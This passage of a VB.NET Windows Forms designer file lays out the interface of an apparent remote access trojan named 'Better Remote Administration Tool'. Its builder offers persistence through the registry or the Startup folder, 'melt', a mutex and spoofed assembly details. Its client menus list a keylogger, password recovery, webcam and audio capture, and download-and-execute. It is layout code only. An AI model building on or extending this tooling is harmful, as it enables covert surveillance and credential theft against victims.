        Me.Label8.Text = "Dropped File Name: "
        '
        'tb_subfoldername
        '
        Me.tb_subfoldername.Enabled = False
        Me.tb_subfoldername.ForeColor = System.Drawing.SystemColors.ControlText
        Me.tb_subfoldername.Location = New System.Drawing.Point(151, 62)
        Me.tb_subfoldername.Name = "tb_subfoldername"
        Me.tb_subfoldername.Size = New System.Drawing.Size(207, 25)
        Me.tb_subfoldername.TabIndex = 8
        Me.tb_subfoldername.Text = "SubFolder Name"
        '
        'cb_dropinsubfolder
        '
        Me.cb_dropinsubfolder.AutoSize = True
        Me.cb_dropinsubfolder.Enabled = False
        Me.cb_dropinsubfolder.Location = New System.Drawing.Point(6, 63)
        Me.cb_dropinsubfolder.Name = "cb_dropinsubfolder"
        Me.cb_dropinsubfolder.Size = New System.Drawing.Size(139, 23)
        Me.cb_dropinsubfolder.TabIndex = 7
        Me.cb_dropinsubfolder.Text = "Drop in SubFolder"
        Me.cb_dropinsubfolder.UseVisualStyleBackColor = True
        '
        'Label7
        '
        Me.Label7.AutoSize = True
        Me.Label7.Location = New System.Drawing.Point(2, 35)
        Me.Label7.Name = "Label7"
        Me.Label7.Size = New System.Drawing.Size(69, 19)
        Me.Label7.TabIndex = 1
        Me.Label7.Text = "Install to: "
        '
        'cb_installenable
        '
        Me.cb_installenable.AutoSize = True
        Me.cb_installenable.Location = New System.Drawing.Point(6, 6)
        Me.cb_installenable.Name = "cb_installenable"
        Me.cb_installenable.Size = New System.Drawing.Size(139, 23)
        Me.cb_installenable.TabIndex = 0
        Me.cb_installenable.Text = "Enable Installation"
        Me.cb_installenable.UseVisualStyleBackColor = True
        '
        'TabPage3
        '
        Me.TabPage3.BackColor = System.Drawing.Color.White
        Me.TabPage3.Controls.Add(Me.GroupBox7)
        Me.TabPage3.Controls.Add(Me.GroupBox6)
        Me.TabPage3.Controls.Add(Me.GroupBox5)
        Me.TabPage3.Location = New System.Drawing.Point(140, 4)
        Me.TabPage3.Name = "TabPage3"
        Me.TabPage3.Size = New System.Drawing.Size(726, 282)
        Me.TabPage3.TabIndex = 2
        Me.TabPage3.Text = "Final Build Settings"
        '
        'GroupBox7
        '
        Me.GroupBox7.Controls.Add(Me.RichTextBox1)
        Me.GroupBox7.Controls.Add(Me.cb_compress)
        Me.GroupBox7.Controls.Add(Me.btn_build)
        Me.GroupBox7.Location = New System.Drawing.Point(421, 137)
        Me.GroupBox7.Name = "GroupBox7"
        Me.GroupBox7.Size = New System.Drawing.Size(299, 140)
        Me.GroupBox7.TabIndex = 2
        Me.GroupBox7.TabStop = False
        Me.GroupBox7.Text = "Build"
        '
        'RichTextBox1
        '
        Me.RichTextBox1.Location = New System.Drawing.Point(8, 24)
        Me.RichTextBox1.Name = "RichTextBox1"
        Me.RichTextBox1.Size = New System.Drawing.Size(285, 72)
        Me.RichTextBox1.TabIndex = 2
        Me.RichTextBox1.Text = ""
        '
        'cb_compress
        '
        Me.cb_compress.AutoSize = True
        Me.cb_compress.Location = New System.Drawing.Point(6, 108)
        Me.cb_compress.Name = "cb_compress"
        Me.cb_compress.Size = New System.Drawing.Size(138, 23)
        Me.cb_compress.TabIndex = 1
        Me.cb_compress.Text = "Compress Output"
        Me.cb_compress.UseVisualStyleBackColor = True
        '
        'btn_build
        '
        Me.btn_build.Location = New System.Drawing.Point(234, 102)
        Me.btn_build.Name = "btn_build"
        Me.btn_build.Size = New System.Drawing.Size(59, 32)
        Me.btn_build.TabIndex = 0
        Me.btn_build.Text = "Build"
        Me.btn_build.UseVisualStyleBackColor = True
        '
        'GroupBox6
        '
        Me.GroupBox6.Controls.Add(Me.Label18)
        Me.GroupBox6.Controls.Add(Me.PictureBox1)
        Me.GroupBox6.Location = New System.Drawing.Point(421, 5)
        Me.GroupBox6.Name = "GroupBox6"
        Me.GroupBox6.Size = New System.Drawing.Size(299, 126)
        Me.GroupBox6.TabIndex = 1
        Me.GroupBox6.TabStop = False
        Me.GroupBox6.Text = "Icon"
        '
        'Label18
        '
        Me.Label18.AutoSize = True
        Me.Label18.Location = New System.Drawing.Point(137, 54)
        Me.Label18.Name = "Label18"
        Me.Label18.Size = New System.Drawing.Size(125, 19)
        Me.Label18.TabIndex = 1
        Me.Label18.Text = " Drag ´n Drop here"
        '
        'PictureBox1
        '
        Me.PictureBox1.Location = New System.Drawing.Point(8, 24)
        Me.PictureBox1.Name = "PictureBox1"
        Me.PictureBox1.Size = New System.Drawing.Size(96, 96)
        Me.PictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage
        Me.PictureBox1.TabIndex = 0
        Me.PictureBox1.TabStop = False
        '
        'GroupBox5
        '
        Me.GroupBox5.Controls.Add(Me.btn_generate)
        Me.GroupBox5.Controls.Add(Me.tb_assemblyfileversion)
        Me.GroupBox5.Controls.Add(Me.tb_assemblyversion)
        Me.GroupBox5.Controls.Add(Me.Label11)
        Me.GroupBox5.Controls.Add(Me.Label10)
        Me.GroupBox5.Controls.Add(Me.Label12)
        Me.GroupBox5.Controls.Add(Me.Label13)
        Me.GroupBox5.Controls.Add(Me.Label14)
        Me.GroupBox5.Controls.Add(Me.Label15)
        Me.GroupBox5.Controls.Add(Me.Label16)
        Me.GroupBox5.Controls.Add(Me.Label17)
        Me.GroupBox5.Controls.Add(Me.tb_assemblytrademark)
        Me.GroupBox5.Controls.Add(Me.tb_assemblycopyright)
        Me.GroupBox5.Controls.Add(Me.tb_assemblyproduct)
        Me.GroupBox5.Controls.Add(Me.tb_assemblycompany)
        Me.GroupBox5.Controls.Add(Me.tb_assemblydescription)
        Me.GroupBox5.Controls.Add(Me.tb_assemblytitle)
        Me.GroupBox5.Location = New System.Drawing.Point(3, 3)
        Me.GroupBox5.Name = "GroupBox5"
        Me.GroupBox5.Size = New System.Drawing.Size(412, 274)
        Me.GroupBox5.TabIndex = 0
        Me.GroupBox5.TabStop = False
        Me.GroupBox5.Text = "Assembly Information"
        '
        'btn_generate
        '
        Me.btn_generate.Location = New System.Drawing.Point(312, 236)
        Me.btn_generate.Name = "btn_generate"
        Me.btn_generate.Size = New System.Drawing.Size(81, 32)
        Me.btn_generate.TabIndex = 37
        Me.btn_generate.Text = "Generate"
        Me.btn_generate.UseVisualStyleBackColor = True
        '
        'tb_assemblyfileversion
        '
        Me.tb_assemblyfileversion.Location = New System.Drawing.Point(157, 205)
        Me.tb_assemblyfileversion.Mask = "0,0,0,0"
        Me.tb_assemblyfileversion.Name = "tb_assemblyfileversion"
        Me.tb_assemblyfileversion.Size = New System.Drawing.Size(236, 25)
        Me.tb_assemblyfileversion.TabIndex = 36
        Me.tb_assemblyfileversion.Text = "0000"
        '
        'tb_assemblyversion
        '
        Me.tb_assemblyversion.Location = New System.Drawing.Point(157, 179)
        Me.tb_assemblyversion.Mask = "0,0,0,0"
        Me.tb_assemblyversion.Name = "tb_assemblyversion"
        Me.tb_assemblyversion.Size = New System.Drawing.Size(236, 25)
        Me.tb_assemblyversion.TabIndex = 35
        Me.tb_assemblyversion.Text = "0000"
        '
        'Label11
        '
        Me.Label11.AutoSize = True
        Me.Label11.Location = New System.Drawing.Point(9, 208)
        Me.Label11.Name = "Label11"
        Me.Label11.Size = New System.Drawing.Size(147, 19)
        Me.Label11.TabIndex = 34
        Me.Label11.Text = "Assembly File Version: "
        '
        'Label10
        '
        Me.Label10.AutoSize = True
        Me.Label10.Location = New System.Drawing.Point(9, 182)
        Me.Label10.Name = "Label10"
        Me.Label10.Size = New System.Drawing.Size(123, 19)
        Me.Label10.TabIndex = 33
        Me.Label10.Text = "Assembly Version: "
        '
        'Label12
        '
        Me.Label12.AutoSize = True
        Me.Label12.Location = New System.Drawing.Point(9, 156)
        Me.Label12.Name = "Label12"
        Me.Label12.Size = New System.Drawing.Size(142, 19)
        Me.Label12.TabIndex = 32
        Me.Label12.Text = "Assembly Trademark: "
        '
        'Label13
        '
        Me.Label13.AutoSize = True
        Me.Label13.Location = New System.Drawing.Point(9, 130)
        Me.Label13.Name = "Label13"
        Me.Label13.Size = New System.Drawing.Size(139, 19)
        Me.Label13.TabIndex = 31
        Me.Label13.Text = "Assembly Copyright: "
        '
        'Label14
        '
        Me.Label14.AutoSize = True
        Me.Label14.Location = New System.Drawing.Point(9, 104)
        Me.Label14.Name = "Label14"
        Me.Label14.Size = New System.Drawing.Size(126, 19)
        Me.Label14.TabIndex = 30
        Me.Label14.Text = "Assembly Product: "
        '
        'Label15
        '
        Me.Label15.AutoSize = True
        Me.Label15.Location = New System.Drawing.Point(9, 78)
        Me.Label15.Name = "Label15"
        Me.Label15.Size = New System.Drawing.Size(137, 19)
        Me.Label15.TabIndex = 29
        Me.Label15.Text = "Assembly Company: "
        '
        'Label16
        '
        Me.Label16.AutoSize = True
        Me.Label16.Location = New System.Drawing.Point(9, 52)
        Me.Label16.Name = "Label16"
        Me.Label16.Size = New System.Drawing.Size(147, 19)
        Me.Label16.TabIndex = 28
        Me.Label16.Text = "Assembly Description: "
        '
        'Label17
        '
        Me.Label17.AutoSize = True
        Me.Label17.Location = New System.Drawing.Point(9, 26)
        Me.Label17.Name = "Label17"
        Me.Label17.Size = New System.Drawing.Size(103, 19)
        Me.Label17.TabIndex = 27
        Me.Label17.Text = "Assembly Title: "
        '
        'tb_assemblytrademark
        '
        Me.tb_assemblytrademark.Location = New System.Drawing.Point(157, 153)
        Me.tb_assemblytrademark.Name = "tb_assemblytrademark"
        Me.tb_assemblytrademark.Size = New System.Drawing.Size(236, 25)
        Me.tb_assemblytrademark.TabIndex = 26
        '
        'tb_assemblycopyright
        '
        Me.tb_assemblycopyright.Location = New System.Drawing.Point(157, 127)
        Me.tb_assemblycopyright.Name = "tb_assemblycopyright"
        Me.tb_assemblycopyright.Size = New System.Drawing.Size(236, 25)
        Me.tb_assemblycopyright.TabIndex = 25
        '
        'tb_assemblyproduct
        '
        Me.tb_assemblyproduct.Location = New System.Drawing.Point(157, 101)
        Me.tb_assemblyproduct.Name = "tb_assemblyproduct"
        Me.tb_assemblyproduct.Size = New System.Drawing.Size(236, 25)
        Me.tb_assemblyproduct.TabIndex = 24
        '
        'tb_assemblycompany
        '
        Me.tb_assemblycompany.Location = New System.Drawing.Point(157, 75)
        Me.tb_assemblycompany.Name = "tb_assemblycompany"
        Me.tb_assemblycompany.Size = New System.Drawing.Size(236, 25)
        Me.tb_assemblycompany.TabIndex = 23
        '
        'tb_assemblydescription
        '
        Me.tb_assemblydescription.Location = New System.Drawing.Point(157, 49)
        Me.tb_assemblydescription.Name = "tb_assemblydescription"
        Me.tb_assemblydescription.Size = New System.Drawing.Size(236, 25)
        Me.tb_assemblydescription.TabIndex = 22
        '
        'tb_assemblytitle
        '
        Me.tb_assemblytitle.Location = New System.Drawing.Point(157, 23)
        Me.tb_assemblytitle.Name = "tb_assemblytitle"
        Me.tb_assemblytitle.Size = New System.Drawing.Size(236, 25)
        Me.tb_assemblytitle.TabIndex = 21
        '
        'TabSettings
        '
        Me.TabSettings.Controls.Add(Me.GroupBox4)
        Me.TabSettings.Controls.Add(Me.GroupBox3)
        Me.TabSettings.Controls.Add(Me.GroupBox1)
        Me.TabSettings.Location = New System.Drawing.Point(4, 45)
        Me.TabSettings.Name = "TabSettings"
        Me.TabSettings.Size = New System.Drawing.Size(871, 291)
        Me.TabSettings.TabIndex = 2
        Me.TabSettings.Text = "Settings"
        Me.TabSettings.UseVisualStyleBackColor = True
        '
        'GroupBox4
        '
        Me.GroupBox4.Controls.Add(Me.Label19)
        Me.GroupBox4.Controls.Add(Me.PictureBox2)
        Me.GroupBox4.Location = New System.Drawing.Point(302, 169)
        Me.GroupBox4.Name = "GroupBox4"
        Me.GroupBox4.Size = New System.Drawing.Size(566, 113)
        Me.GroupBox4.TabIndex = 2
        Me.GroupBox4.TabStop = False
        Me.GroupBox4.Text = "About"
        '
        'Label19
        '
        Me.Label19.AutoSize = True
        Me.Label19.Location = New System.Drawing.Point(94, 24)
        Me.Label19.Name = "Label19"
        Me.Label19.Size = New System.Drawing.Size(471, 57)
        Me.Label19.TabIndex = 1
        Me.Label19.Text = resources.GetString("Label19.Text")
        '
        'PictureBox2
        '
        Me.PictureBox2.Image = CType(resources.GetObject("PictureBox2.Image"), System.Drawing.Image)
        Me.PictureBox2.Location = New System.Drawing.Point(6, 24)
        Me.PictureBox2.Name = "PictureBox2"
        Me.PictureBox2.Size = New System.Drawing.Size(83, 83)
        Me.PictureBox2.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage
        Me.PictureBox2.TabIndex = 0
        Me.PictureBox2.TabStop = False
        '
        'GroupBox3
        '
        Me.GroupBox3.Controls.Add(Me.ListViewOnConnect)
        Me.GroupBox3.Location = New System.Drawing.Point(302, 3)
        Me.GroupBox3.Name = "GroupBox3"
        Me.GroupBox3.Size = New System.Drawing.Size(566, 160)
        Me.GroupBox3.TabIndex = 1
        Me.GroupBox3.TabStop = False
        Me.GroupBox3.Text = "On Connect"
        '
        'ListViewOnConnect
        '
        Me.ListViewOnConnect.Columns.AddRange(New System.Windows.Forms.ColumnHeader() {Me.ColumnHeader10, Me.ColumnHeader11, Me.ColumnHeader12})
        Me.ListViewOnConnect.ContextMenuStrip = Me.Rightclick_OnConnect
        Me.ListViewOnConnect.FullRowSelect = True
        Me.ListViewOnConnect.Location = New System.Drawing.Point(6, 24)
        Me.ListViewOnConnect.Name = "ListViewOnConnect"
        Me.ListViewOnConnect.Size = New System.Drawing.Size(553, 130)
        Me.ListViewOnConnect.TabIndex = 0
        Me.ListViewOnConnect.UseCompatibleStateImageBehavior = False
        Me.ListViewOnConnect.View = System.Windows.Forms.View.Details
        '
        'ColumnHeader10
        '
        Me.ColumnHeader10.Text = "Action"
        Me.ColumnHeader10.Width = 156
        '
        'ColumnHeader11
        '
        Me.ColumnHeader11.Text = "Information"
        Me.ColumnHeader11.Width = 301
        '
        'ColumnHeader12
        '
        Me.ColumnHeader12.Text = "Status"
        Me.ColumnHeader12.Width = 69
        '
        'GroupBox1
        '
        Me.GroupBox1.Controls.Add(Me.cb_PlaySound)
        Me.GroupBox1.Controls.Add(Me.cb_ShowNotification)
        Me.GroupBox1.Controls.Add(Me.cb_autolistening)
        Me.GroupBox1.Controls.Add(Me.btn_stoplistening)
        Me.GroupBox1.Controls.Add(Me.btn_startlistening)
        Me.GroupBox1.Controls.Add(Me.GroupBox2)
        Me.GroupBox1.Location = New System.Drawing.Point(5, 3)
        Me.GroupBox1.Name = "GroupBox1"
        Me.GroupBox1.Size = New System.Drawing.Size(291, 279)
        Me.GroupBox1.TabIndex = 0
        Me.GroupBox1.TabStop = False
        Me.GroupBox1.Text = "Connection"
        '
        'cb_PlaySound
        '
        Me.cb_PlaySound.Anchor = CType((((System.Windows.Forms.AnchorStyles.Top Or System.Windows.Forms.AnchorStyles.Bottom) _
            Or System.Windows.Forms.AnchorStyles.Left) _
            Or System.Windows.Forms.AnchorStyles.Right), System.Windows.Forms.AnchorStyles)
        Me.cb_PlaySound.AutoSize = True
        Me.cb_PlaySound.Location = New System.Drawing.Point(6, 250)
        Me.cb_PlaySound.Name = "cb_PlaySound"
        Me.cb_PlaySound.Size = New System.Drawing.Size(190, 23)
        Me.cb_PlaySound.TabIndex = 6
        Me.cb_PlaySound.Text = "Play Sound on Connection"
        Me.cb_PlaySound.UseVisualStyleBackColor = True
        '
        'cb_ShowNotification
        '
        Me.cb_ShowNotification.Anchor = CType((((System.Windows.Forms.AnchorStyles.Top Or System.Windows.Forms.AnchorStyles.Bottom) _
            Or System.Windows.Forms.AnchorStyles.Left) _
            Or System.Windows.Forms.AnchorStyles.Right), System.Windows.Forms.AnchorStyles)
        Me.cb_ShowNotification.AutoSize = True
        Me.cb_ShowNotification.Location = New System.Drawing.Point(6, 227)
        Me.cb_ShowNotification.Name = "cb_ShowNotification"
        Me.cb_ShowNotification.Size = New System.Drawing.Size(229, 23)
        Me.cb_ShowNotification.TabIndex = 5
        Me.cb_ShowNotification.Text = "Show Notification on Connection"
        Me.cb_ShowNotification.UseVisualStyleBackColor = True
        '
        'cb_autolistening
        '
        Me.cb_autolistening.Anchor = CType((((System.Windows.Forms.AnchorStyles.Top Or System.Windows.Forms.AnchorStyles.Bottom) _
            Or System.Windows.Forms.AnchorStyles.Left) _
            Or System.Windows.Forms.AnchorStyles.Right), System.Windows.Forms.AnchorStyles)
        Me.cb_autolistening.AutoSize = True
        Me.cb_autolistening.Location = New System.Drawing.Point(6, 204)
        Me.cb_autolistening.Name = "cb_autolistening"
        Me.cb_autolistening.Size = New System.Drawing.Size(161, 23)
        Me.cb_autolistening.TabIndex = 4
        Me.cb_autolistening.Text = "Enable Auto Listening"
        Me.cb_autolistening.UseVisualStyleBackColor = True
        '
        'btn_stoplistening
        '
        Me.btn_stoplistening.Location = New System.Drawing.Point(148, 166)
        Me.btn_stoplistening.Name = "btn_stoplistening"
        Me.btn_stoplistening.Size = New System.Drawing.Size(137, 32)
        Me.btn_stoplistening.TabIndex = 3
        Me.btn_stoplistening.Text = "Stop Listening"
        Me.btn_stoplistening.UseVisualStyleBackColor = True
        '
        'btn_startlistening
        '
        Me.btn_startlistening.Location = New System.Drawing.Point(6, 166)
        Me.btn_startlistening.Name = "btn_startlistening"
        Me.btn_startlistening.Size = New System.Drawing.Size(137, 32)
        Me.btn_startlistening.TabIndex = 2
        Me.btn_startlistening.Text = "Start Listening"
        Me.btn_startlistening.UseVisualStyleBackColor = True
        '
        'GroupBox2
        '
        Me.GroupBox2.Controls.Add(Me.NumericUpDown1)
        Me.GroupBox2.Controls.Add(Me.Label3)
        Me.GroupBox2.Controls.Add(Me.Label2)
        Me.GroupBox2.Controls.Add(Me.Label1)
        Me.GroupBox2.Location = New System.Drawing.Point(6, 24)
        Me.GroupBox2.Name = "GroupBox2"
        Me.GroupBox2.Size = New System.Drawing.Size(279, 136)
        Me.GroupBox2.TabIndex = 1
        Me.GroupBox2.TabStop = False
        Me.GroupBox2.Text = "Socks"
        '
        'NumericUpDown1
        '
        Me.NumericUpDown1.Location = New System.Drawing.Point(54, 28)
        Me.NumericUpDown1.Maximum = New Decimal(New Integer() {65535, 0, 0, 0})
        Me.NumericUpDown1.Name = "NumericUpDown1"
        Me.NumericUpDown1.Size = New System.Drawing.Size(59, 25)
        Me.NumericUpDown1.TabIndex = 3
        '
        'Label3
        '
        Me.Label3.AutoSize = True
        Me.Label3.Location = New System.Drawing.Point(6, 68)
        Me.Label3.Name = "Label3"
        Me.Label3.Size = New System.Drawing.Size(129, 38)
        Me.Label3.TabIndex = 2
        Me.Label3.Text = "Encryption: Enabled" & Global.Microsoft.VisualBasic.ChrW(13) & Global.Microsoft.VisualBasic.ChrW(10) & "Key: magic_key"
        '
        'Label2
        '
        Me.Label2.AutoSize = True
        Me.Label2.Location = New System.Drawing.Point(119, 30)
        Me.Label2.Name = "Label2"
        Me.Label2.Size = New System.Drawing.Size(85, 19)
        Me.Label2.TabIndex = 1
        Me.Label2.Text = "Status: Idle..."
        '
        'Label1
        '
        Me.Label1.AutoSize = True
        Me.Label1.Location = New System.Drawing.Point(6, 30)
        Me.Label1.Name = "Label1"
        Me.Label1.Size = New System.Drawing.Size(41, 19)
        Me.Label1.TabIndex = 0
        Me.Label1.Text = "Port: "
        '
        'Form1
        '
        Me.AutoScaleDimensions = New System.Drawing.SizeF(6.0!, 13.0!)
        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
        Me.ClientSize = New System.Drawing.Size(879, 340)
        Me.Controls.Add(Me.CodePlexTabControl1)
        Me.Icon = CType(resources.GetObject("$this.Icon"), System.Drawing.Icon)
        Me.MinimumSize = New System.Drawing.Size(895, 378)
        Me.Name = "Form1"
        Me.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen
        Me.Text = "Better Remote Administration Tool"
        Me.RightclickMain.ResumeLayout(False)
        Me.Rightclick_OnConnect.ResumeLayout(False)
        Me.CodePlexTabControl1.ResumeLayout(False)
        Me.TabClient.ResumeLayout(False)
        Me.TabBuilder.ResumeLayout(False)
        Me.DotNetBarTabcontrol1.ResumeLayout(False)
        Me.TabPage1.ResumeLayout(False)
        Me.TabPage1.PerformLayout()
        CType(Me.NumericUpDown2, System.ComponentModel.ISupportInitialize).EndInit()
        Me.TabPage2.ResumeLayout(False)
        Me.TabPage2.PerformLayout()
        Me.Panel1.ResumeLayout(False)
        Me.Panel1.PerformLayout()
        CType(Me.nud_delay, System.ComponentModel.ISupportInitialize).EndInit()
        Me.TabPage3.ResumeLayout(False)
        Me.GroupBox7.ResumeLayout(False)
        Me.GroupBox7.PerformLayout()
        Me.GroupBox6.ResumeLayout(False)
        Me.GroupBox6.PerformLayout()
        CType(Me.PictureBox1, System.ComponentModel.ISupportInitialize).EndInit()
        Me.GroupBox5.ResumeLayout(False)
        Me.GroupBox5.PerformLayout()
        Me.TabSettings.ResumeLayout(False)
        Me.GroupBox4.ResumeLayout(False)
        Me.GroupBox4.PerformLayout()
        CType(Me.PictureBox2, System.ComponentModel.ISupportInitialize).EndInit()
        Me.GroupBox3.ResumeLayout(False)
        Me.GroupBox1.ResumeLayout(False)
        Me.GroupBox1.PerformLayout()
        Me.GroupBox2.ResumeLayout(False)
        Me.GroupBox2.PerformLayout()
        CType(Me.NumericUpDown1, System.ComponentModel.ISupportInitialize).EndInit()
        Me.ResumeLayout(False)

    End Sub
    Friend WithEvents CodePlexTabControl1 As Diamond_Remote_Administration_Tool.CodePlexTabControl
    Friend WithEvents TabClient As System.Windows.Forms.TabPage
    Friend WithEvents TabBuilder As System.Windows.Forms.TabPage
    Friend WithEvents TabSettings As System.Windows.Forms.TabPage
    Friend WithEvents GroupBox1 As System.Windows.Forms.GroupBox
    Friend WithEvents GroupBox2 As System.Windows.Forms.GroupBox
    Friend WithEvents btn_stoplistening As System.Windows.Forms.Button
    Friend WithEvents btn_startlistening As System.Windows.Forms.Button
    Friend WithEvents cb_PlaySound As System.Windows.Forms.CheckBox
    Friend WithEvents cb_ShowNotification As System.Windows.Forms.CheckBox
    Friend WithEvents cb_autolistening As System.Windows.Forms.CheckBox
    Friend WithEvents GroupBox4 As System.Windows.Forms.GroupBox
    Friend WithEvents GroupBox3 As System.Windows.Forms.GroupBox
    Friend WithEvents ListView1 As System.Windows.Forms.ListView
    Friend WithEvents ColumnHeader1 As System.Windows.Forms.ColumnHeader
    Friend WithEvents ColumnHeader2 As System.Windows.Forms.ColumnHeader
    Friend WithEvents ColumnHeader3 As System.Windows.Forms.ColumnHeader
    Friend WithEvents ColumnHeader4 As System.Windows.Forms.ColumnHeader
    Friend WithEvents ColumnHeader5 As System.Windows.Forms.ColumnHeader
    Friend WithEvents ColumnHeader6 As System.Windows.Forms.ColumnHeader
    Friend WithEvents ColumnHeader7 As System.Windows.Forms.ColumnHeader
    Friend WithEvents ColumnHeader8 As System.Windows.Forms.ColumnHeader
    Friend WithEvents ColumnHeader9 As System.Windows.Forms.ColumnHeader
    Friend WithEvents countryflags As System.Windows.Forms.ImageList
    Friend WithEvents RightclickMain As System.Windows.Forms.ContextMenuStrip
    Friend WithEvents Notify As System.Windows.Forms.NotifyIcon
    Friend WithEvents Label1 As System.Windows.Forms.Label
    Friend WithEvents Label3 As System.Windows.Forms.Label
    Friend WithEvents Label2 As System.Windows.Forms.Label
    Friend WithEvents NumericUpDown1 As System.Windows.Forms.NumericUpDown
    Friend WithEvents GroupByToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents CountryToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents OperatingSystemToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents PrivilegsToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents SystemInformationToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents SurveillanceToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents RemoteDesktopToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents ListViewOnConnect As System.Windows.Forms.ListView
    Friend WithEvents ColumnHeader10 As System.Windows.Forms.ColumnHeader
    Friend WithEvents ColumnHeader11 As System.Windows.Forms.ColumnHeader
    Friend WithEvents Rightclick_OnConnect As System.Windows.Forms.ContextMenuStrip
    Friend WithEvents OpenUrlToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents DownloadExecuteToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents ShoweMessageBoxToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents ColumnHeader12 As System.Windows.Forms.ColumnHeader
    Friend WithEvents RemoveActionToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents DisableActionToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents EnableActionToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents MapViewToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents StressTesterToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents ServerOptionsToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents MiscellaneousToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents UpdateServerToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents FromFileToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents FromURLToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents ExecuteFileToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents UninstallToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents RestartToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents RemoteKeyloggerToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents AudioCaptureToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents PasswordRecoveryToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents FromFileToolStripMenuItem1 As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents FromURLToolStripMenuItem1 As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents RemoteWebcamToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents UserInputToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents RemoteChatToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents MessageBoxToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents ViewThumbnailsToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents FunFunctionsToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents ScriptingToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents MiscellaneousToolStripMenuItem1 As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents PingToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents DotNetBarTabcontrol1 As Diamond_Remote_Administration_Tool.DotNetBarTabcontrol
    Friend WithEvents TabPage1 As System.Windows.Forms.TabPage
    Friend WithEvents RandomPool1 As Diamond_Remote_Administration_Tool.RandomPool
    Friend WithEvents tb_mutex As System.Windows.Forms.TextBox
    Friend WithEvents Label6 As System.Windows.Forms.Label
    Friend WithEvents NumericUpDown2 As System.Windows.Forms.NumericUpDown
    Friend WithEvents Label5 As System.Windows.Forms.Label
    Friend WithEvents Label4 As System.Windows.Forms.Label
    Friend WithEvents TabPage2 As System.Windows.Forms.TabPage
    Friend WithEvents cb_installenable As System.Windows.Forms.CheckBox
    Friend WithEvents Label7 As System.Windows.Forms.Label
    Friend WithEvents tb_subfoldername As System.Windows.Forms.TextBox
    Friend WithEvents cb_dropinsubfolder As System.Windows.Forms.CheckBox
    Friend WithEvents tb_execname As System.Windows.Forms.TextBox
    Friend WithEvents Label8 As System.Windows.Forms.Label
    Friend WithEvents rb_hkeylocal As System.Windows.Forms.RadioButton
    Friend WithEvents rb_hkeyuser As System.Windows.Forms.RadioButton
    Friend WithEvents rb_Startupfolder As System.Windows.Forms.RadioButton
    Friend WithEvents cb_enablestartup As System.Windows.Forms.CheckBox
    Friend WithEvents cb_persistence As System.Windows.Forms.CheckBox
    Friend WithEvents cb_melt As System.Windows.Forms.CheckBox
    Friend WithEvents cb_delay As System.Windows.Forms.CheckBox
    Friend WithEvents Label9 As System.Windows.Forms.Label
    Friend WithEvents nud_delay As System.Windows.Forms.NumericUpDown
    Friend WithEvents TabPage3 As System.Windows.Forms.TabPage
    Friend WithEvents GroupBox5 As System.Windows.Forms.GroupBox
    Friend WithEvents tb_assemblyfileversion As System.Windows.Forms.MaskedTextBox
    Friend WithEvents tb_assemblyversion As System.Windows.Forms.MaskedTextBox
    Friend WithEvents Label11 As System.Windows.Forms.Label
    Friend WithEvents Label10 As System.Windows.Forms.Label
    Friend WithEvents Label12 As System.Windows.Forms.Label
    Friend WithEvents Label13 As System.Windows.Forms.Label
    Friend WithEvents Label14 As System.Windows.Forms.Label
    Friend WithEvents Label15 As System.Windows.Forms.Label
    Friend WithEvents Label16 As System.Windows.Forms.Label
    Friend WithEvents Label17 As System.Windows.Forms.Label
    Friend WithEvents tb_assemblytrademark As System.Windows.Forms.TextBox
    Friend WithEvents tb_assemblycopyright As System.Windows.Forms.TextBox
    Friend WithEvents tb_assemblyproduct As System.Windows.Forms.TextBox
    Friend WithEvents tb_assemblycompany As System.Windows.Forms.TextBox
    Friend WithEvents tb_assemblydescription As System.Windows.Forms.TextBox
    Friend WithEvents tb_assemblytitle As System.Windows.Forms.TextBox
